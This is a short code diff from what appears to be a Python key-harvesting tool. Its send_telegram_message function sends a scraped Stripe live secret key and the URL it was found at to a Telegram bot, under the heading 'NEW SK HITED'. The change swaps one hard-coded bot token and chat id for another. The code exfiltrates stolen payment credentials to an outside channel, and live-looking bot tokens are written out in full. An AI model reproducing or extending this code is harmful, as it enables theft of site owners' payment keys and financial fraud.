@@ -20,9 +20,9 @@ skkey = 'sk_live'
 
 class ENV:
     def send_telegram_message(self, url, sk_key):
-        telegram_api_url = f"https://api.telegram.org/bot7389066468:AAHG5UyOxxHyO5oJ3h4S9_q9asorcPCxx04/sendMessage"
+        telegram_api_url = f"https://api.telegram.org/bot7980470840:AAFQ-8qcHmk-jTxXZq5YpnPeeyVgBMs6rZc/sendMessage"
         message = f'𝗡𝗘𝗪 𝗦𝗞 𝗛𝗜𝗧𝗘𝗗\n\n<code>{sk_key}</code>\n\n𝗙𝗥𝗢𝗠 𝗧𝗛𝗜𝗦 𝗨𝗥𝗟\n{url}'
-        params = {'chat_id': '-1002240582236', 'text': message, 'parse_mode': 'HTML'}
+        params = {'chat_id': '-1004784256934', 'text': message, 'parse_mode': 'HTML'}
 
         try:
             response = requests.get(telegram_api_url, params=params)
